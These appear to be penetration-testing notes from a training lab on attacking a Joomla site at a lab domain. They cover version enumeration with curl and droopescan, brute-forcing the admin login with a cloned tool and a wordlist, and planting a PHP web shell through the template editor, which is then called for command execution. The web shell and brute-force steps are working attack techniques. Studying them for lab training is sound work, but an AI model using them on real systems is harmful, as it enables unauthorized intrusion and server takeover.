### Enumeration

Joomla collect anonymous stats:

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

Verify Joomla is in use:

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Robots.txt:

```bash
curl -s http://dev.inlanefreight.local/robots.txt
```

Verify version:

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

Probably the best way to get the version:

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Another way:

```bash
curl -s http://dev.inlanefreight.local/language/en-GB/en-GB.xml
```

Automation (Not good at enumerating version):

```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/
```

### Attack

Bruteforcing:

- Admin Portal: `http://dev.inlanefreight.local/administrator/index.php`

- Default username `admin`

Download bruteforcing tool:

```
git clone https://github.com/ajnik/joomla-bruteforce.git
```

Run:

```bash
python3 joomla-brute.py -u http://dev.inlanefreight.local -w /opt/metasploit-framework/embedded/framework/data/wordlists/http_default_pass.txt -usr admin
```

Code Execution:

Once logged in go to `templates`

![[Pasted image 20250131162653.png]]

Select a template:

![[Pasted image 20250131162717.png]]

Pick a php file

![[Pasted image 20250131162758.png]]

Add `system($_GET['cmd']);` into file and `Save & Close:`

![[Pasted image 20250131162848.png]]

Use CURL for RCE:

```bash
curl -s http://app.inlanefreight.local/templates/protostar/error.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


